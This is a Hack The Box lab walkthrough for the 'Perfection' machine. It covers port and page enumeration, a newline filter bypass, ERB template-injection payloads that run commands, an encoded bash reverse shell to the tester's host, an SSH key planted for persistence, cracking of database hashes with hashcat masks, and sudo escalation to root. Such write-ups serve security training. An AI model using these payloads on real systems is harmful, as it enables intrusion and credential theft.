---
layout: post
title: Hack The Box Walkthrough - Perfection
date: 2024-04-07
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/04/HTB/Perfection
img: 2024/04/Perfection/Perfection.png
---

In this machine, I exploited an SSTI vulnerability, cracked a password found in a database, and used sudo to become root.


* Room: Perfection
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Perfection](https://app.hackthebox.com/machines/Perfection)
* Author: [TheHated1](https://app.hackthebox.com/users/1412009)

## Enumeration

I started the box by scanning for open ports with rustscan.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.239.174:22
Open 10.129.239.174:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 12:42 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:42

...

Scanned at 2024-04-06 12:42:34 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz41H9QQUPCXN7lJsU+fbjZ/vR4Ho/eacq8LnS89xLx4vsJvjUJCcZgMYAmhHLXIGKnVv16ipqPaDom5cK9tig=
|   256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqNwnyqGqYHNSIjQnv7hRU0UC9Q4oB4g9Pfzuj2qcG4
80/tcp open  http    syn-ack nginx
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds
```

Only ports 22 (SSH) and 80 (HTTP) were open. I also scanned for UDP ports, finding only port 68 (DHCP) open.

```bash
$ sudo nmap -sU target -oN nampUdp.txt
[sudo] password for ehogue:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-07 08:32 EDT
Nmap scan report for target (10.129.229.121)
Host is up (0.076s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1036.18 seconds
```

I ran Feroxbuster to check for hidden pages.

```bash
$ feroxbuster -u http://target.htb -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       21l       37w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      142l      444w     5191c http://target.htb/weighted-grade
200      GET       32l      220w    13738c http://target.htb/images/checklist.jpg
200      GET      103l      387w     3827c http://target.htb/about
200      GET        6l       12w      173c http://target.htb/css/montserrat.css
200      GET       11l       52w     3860c http://target.htb/images/lightning.png
200      GET        6l       12w      142c http://target.htb/css/lato.css
200      GET      235l      442w    23427c http://target.htb/css/w3.css
200      GET       51l      214w    14842c http://target.htb/images/susan.jpg
200      GET        4l       66w    31000c http://target.htb/css/font-awesome.min.css
200      GET      101l      390w     3842c http://target.htb/
200      GET      176l     1024w    79295c http://target.htb/images/tina.jpg
[####################] - 5m    119613/119613  0s      found:11      errors:3
[####################] - 5m    119601/119601  386/s   http://target.htb/
```

It did not find anything that I did not see on the website.

## Remote Code Execution

I looked at the website in a browser.

![Website](/assets/images/2024/04/Perfection/Website.png "Website")

The website had a calculator to compute the grades for a class.

![Calculator](/assets/images/2024/04/Perfection/CalculateYourWeightGrade.png "Calculator")

The site said it was using [WEBrick 1.7.0](https://github.com/ruby/webrick). A quick search did not show any vulnerability I could use in this version.

I looked at the request that was made when calculating a grade. I thought I might be able to modify to hijack the command that was used to compute the grade, or maybe get [Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection) when the data was reflected back. I tried tampering with the payload. Every special character I sent to execute a command or get SSTI returned the error 'Malicious input blocked'.

I tried some fuzzing with `wfuzz`.

```bash
$ wfuzz -c -w /usr/share/seclists/Fuzzing/special-chars.txt  -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'category1=1&grade1=20&weight1=20&category2=2&grade2=20&weight2=20&category3=3&grade3=20&weight3=20&category4=4&grade4=20&weight4=20&category5=5&grade5=20&weight5=20FUZZ' --hh 5220 "http://target.htb/weighted-grade-calc"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://target.htb/weighted-grade-calc
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000006:   400        0 L      6 W        50 Ch       "%"
000000008:   200        143 L    454 W      5280 Ch     "&"

Total time: 0.337026
Processed Requests: 32
Filtered Requests: 30
Requests/sec.: 94.94813
```

It did not find anything I could use. While looking at [more ways to get command injection](https://book.hacktricks.xyz/pentesting-web/pocs-and-polygloths-cheatsheet#command-injection), I realized that by adding a new line I could bypass the validation.

If I posted

```
... &category5=5`&grade5=20&weight5=20
```

I got an error. But adding a new line (%0a) did not error out.


```
&category5=5%0a`&grade5=20&weight5=20
```


```html
 Your total grade is 20%<p>1: 4%</p>
<p>2: 4%</p>
<p>3: 4%</p>
<p>4: 4%</p>
<p>5
    `: 4%</p>
```

I tried adding the command injection and [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) payloads until I found one that worked. Sending `<%= 7*7 %>` returned 49, which meant the code was vulnerable to SSTI.

I tried to use this to run code on the server.

```
&category5=5%0a<%25= `ls /` %25>&grade5=20&weight5=20
```

```html
<p>5
        bin
        boot
        dev
        etc
        home
...
        var
        : 4%</p>
```

With that confirmation, created a payload get a reverse shell.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.87/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODcvNDQ0NCAwPiYxICAK
```

I started a netcat listener and sent the payload to the server.

```
&category5=5%0a<%25= `echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODcvNDQ0NCAwPiYxICAK|base64 -d |bash` %25>&grade5=20&weight5=20
```

I got the shell, and the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.87] from (UNKNOWN) [10.129.229.121] 51144
bash: cannot set terminal process group (994): Inappropriate ioctl for device
bash: no job control in this shell

susan@perfection:~/ruby_app$ id
id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)

susan@perfection:~/ruby_app$ ls ~
ls ~
Migration
ruby_app
user.txt

susan@perfection:~/ruby_app$ cat ~/user.txt
cat ~/user.txt
REDACTED
```

## Getting root

I added my SSH public key to the server.

```bash
susan@perfection:~/ruby_app$ cd
cd

susan@perfection:~$ mkdir .ssh
mkdir .ssh

susan@perfection:~$ echo "ssh-rsa AAAA...= " > .ssh/authorized_keys
<...= " > .ssh/authorized_keys

susan@perfection:~$ chmod 700 .ssh
chmod 700 .ssh

susan@perfection:~$ chmod 600 .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

When I reconnected to the server with SSH, it told me I had some emails to read.

```bash
$ ssh susan@target
The authenticity of host 'target (10.129.206.180)' can't be established.
ED25519 key fingerprint is SHA256:Wtv7NKgGLpeIk/fWBeL2EmYo61eHT7hcltaFwt3YGrI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sun Apr  7 04:22:22 PM UTC 2024

  System load:           0.0
  Usage of /:            52.9% of 5.80GB
  Memory usage:          6%
  Swap usage:            0%
  Processes:             250
  Users logged in:       0
  IPv4 address for eth0: 10.129.206.180
  IPv6 address for eth0: dead:beef::250:56ff:feb0:deb1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
```

I read the email, it contained some password rules, but no password.

```bash
susan@perfection:~$ mail
Command 'mail' not found, but can be installed with:
sudo apt install mailutils

susan@perfection:~$ cat /var/spool/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

I checked if I could run anything with `sudo`, but it required a password. I looked at the files in the user's home folder and found a database.


```bash
susan@perfection:~$ file Migration/pupilpath_credentials.db
Migration/pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6

susan@perfection:~$ sqlite3 Migration/pupilpath_credentials.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users

sqlite> Select * From users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

The database contained a few password hashes. I tried cracking them with hashcat, but the passwords were not in rockyou. The passwords had to match the rules described in the email. I tried to create an hashcat rule to attempt cracking all the passwords. But it took me a while to implement all the rules. Eventually, I tried to crack only susan's password.

```bash
$ hashcat -a3 hash.txt --username -m1400 "susan_nasus_?d?d?d?d?d?d?d?d?d"
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Cracking performance lower than expected?

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Sun Apr  7 14:36:35 2024 (1 min, 39 secs)
Time.Estimated...: Sun Apr  7 14:38:14 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3347.2 kH/s (1.04ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324562944/1000000000 (32.46%)
Rejected.........: 0/324562944 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_927935210
Hardware.Mon.#1..: Util: 64%

Started: Sun Apr  7 14:36:34 2024
Stopped: Sun Apr  7 14:38:16 2024
```

I tried to `sudo` with the found password. I worked, and I could run anything I wanted. I used that to `su` as root and read the flag.

```bash
susan@perfection:~$ sudo -l
[sudo] password for susan:
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL

susan@perfection:~$ sudo su -

root@perfection:~# cat /root/root.txt
REDACTED
```